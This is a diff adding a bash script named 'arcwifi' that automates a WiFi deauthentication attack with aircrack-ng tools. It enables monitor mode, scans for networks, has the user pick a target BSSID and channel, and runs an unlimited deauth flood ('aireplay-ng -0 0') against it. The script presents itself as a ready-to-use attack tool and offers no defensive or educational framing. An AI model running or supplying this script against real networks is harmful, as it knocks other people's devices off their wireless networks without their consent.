@@ -1,0 +1,91 @@
+#!/bin/bash
+
+
+apt install aircrack-ng
+clear
+echo ARC-wifi===========================]
+echo [h] help
+echo [1] Attack wifi
+echo [2] check wlan interface
+
+read -p "choose number : " cho
+case $cho in 
+
+h)
+clear
+echo "[wifi interface]"
+echo "1.if you want to attack some wifi you need to know what wifi interface name of your computer"
+echo "2.just click 2 and hit enter"
+echo "-you will see the interface name of your computer"
+echo "[wifi attacking]"
+echo "1.insert the interface name of your computer [example : wlan0]"
+echo "2.now insert the interface name again but now with >>mon<< [example : wlan0mon]"
+echo ">>IF YOU SEE SOME INFO JUST HIT ENTER<<"
+echo "3.now you will be go to the dump screen"
+echo "4.choose your target by copying the bssid"
+echo "5.click ctrl + c and paste the bssid and hit enter"
+echo "6.insert the target channel and hit enter"
+echo "7.now you will be see all host on the wifi"
+echo "8.if you want to start attack just click ctrl + c"
+echo "9.if you want to stop the attack hit ctrl + c again"
+;;
+
+1)
+
+clear
+echo "[Deauth Sender]===================]"
+read -p "please insert your wifi interface : " itf;
+read -p "please reinsert your wifi interface >>with mon<< : " itd;
+airmon-ng start $itf
+
+clear
+
+echo "[info] press Ctrl + C to stop dumping mode"
+read stop
+
+clear
+
+airodump-ng $itd
+echo "[target selector]=================]"
+read -p "please insert target bssid : " bssid;
+read -p "please insert target channel : " channel;
+
+clear
+
+echo "[target bssid : $bssid ] [ target channel : $channel ]" > leastest_hacking_data.txt 
+
+echo "[info] press Ctrl + C to stop host checking mode"
+read stop
+
+echo "[info] press Ctrl + C again to start attack"
+read stl
+
+airodump-ng --bssid $bssid -c $channel $itd
+
+clear
+
+aireplay-ng -0 0 -a $bssid $itd
+
+airmon-ng stop $itd
+
+clear
+echo "================================"
+echo arcwifi v1.2 by ARC developer    ]
+echo "================================"
+
+
+echo "Thanks for using this tools"
+echo "Sayonara~"
+;;
+
+2)
+
+iwconfig
+
+;;
+
+esac
+
+
+
+
